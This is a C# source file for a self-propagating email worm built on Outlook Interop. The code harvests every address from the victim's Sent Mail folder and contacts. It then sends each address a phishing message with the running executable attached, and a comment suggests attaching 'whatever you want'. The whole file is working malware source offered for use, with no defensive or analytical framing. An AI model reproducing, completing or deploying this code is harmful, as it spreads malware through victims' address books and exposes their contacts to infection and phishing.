using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text.RegularExpressions;
using Outlook = Microsoft.Office.Interop.Outlook;
namespace OutlookEmail
{
    class Program
    {
        static void Main(string[] args)
        {
            List<String> RecipientAddresses = GetEmailsFromVictim();

            foreach (String Address in RecipientAddresses)
            {
                SendOutlookEmail(Address);
            }

            Console.WriteLine("!!!DONE!!!");
        }

        private static void SendOutlookEmail(string address)
        {
            Outlook.Application outlook = new Outlook.Application(); //connect to outlook
            Outlook.MailItem mail = outlook.CreateItem(Outlook.OlItemType.olMailItem) as Outlook.MailItem; //create a new email object

            String Subject = "Phishing Subject";
            String Body = "Phishing Body";

            mail.Recipients.Add(address); //add our recipient
            mail.Subject = Subject;
            mail.Body = Body;

            //import System.Reflection
            String PathToSelf = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\" + System.AppDomain.CurrentDomain.FriendlyName;

            //attach executable to email, or change this to attach whatever you want
            mail.Attachments.Add(PathToSelf, Outlook.OlAttachmentType.olByValue, Type.Missing, System.AppDomain.CurrentDomain.FriendlyName);

            mail.Recipients.ResolveAll(); //prepare to send
            mail.Send(); //send
        }

        private static List<string> GetEmailsFromVictim()
        {
            List<String> FinalRecipientList = new List<String>(); //our duplicate-free list of email addresses
            List<String> GatheredEmailsWithDuplicates = new List<String>();
            Outlook.Application outlook = new Outlook.Application(); //create outlook object
            Outlook.NameSpace outlookNameSpace = outlook.GetNamespace("MAPI"); //connect to MAPI namespace
            //connect to the Sent Folder and the Contacts Folder
            Outlook.MAPIFolder SentFolder = outlookNameSpace.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderSentMail);
            Outlook.MAPIFolder ContactsFolder = outlookNameSpace.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderContacts);
            //retrieve all the items within both folders
            Outlook.Items SentItems = SentFolder.Items;
            Outlook.Items ContactItems = ContactsFolder.Items;
            //outlook will give you an array out of bounds exception if you do itemindex = 0
            for (int itemindex = 1; itemindex <= SentItems.Count; itemindex++)
            {
                Outlook.MailItem recipientItem = SentItems[itemindex] as Outlook.MailItem;
                if (recipientItem != null)
                {
                    Outlook.Recipients Recipients = recipientItem.Recipients; //get all email recipients
                    foreach (Outlook.Recipient Recipient in Recipients)
                    {
                        try
                        {
                            //get recipient's email address and add it to our list with duplicates.
                            GatheredEmailsWithDuplicates.Add(Recipient.AddressEntry.GetExchangeUser().PrimarySmtpAddress);
                        }
                        catch (System.Exception e) { continue; } // just ignore any bad items
                    }
                }
            }
            //gather contacts
            for (int itemindex = 1; itemindex <= ContactItems.Count; itemindex++)
            {
                Outlook.ContactItem contactItem = ContactItems[itemindex] as Outlook.ContactItem;
                try
                {
                    GatheredEmailsWithDuplicates.Add(contactItem.Email1Address);
                }
                catch (System.Exception e) { continue; } //just ignore any bad items
            }
            //remove duplicates
            foreach (String VictimAddress in GatheredEmailsWithDuplicates)
            {
                var addresscheck = new System.Net.Mail.MailAddress(VictimAddress);
                if (addresscheck.Address == VictimAddress) //if a valid email address is provided (just incase we picked up anything else)
                {
                    if (!FinalRecipientList.Contains(VictimAddress)) //if we've not yet added our address to the list
                    {
                        FinalRecipientList.Add(VictimAddress);
                    }
                }
            }
            return FinalRecipientList;
        }
    }
}
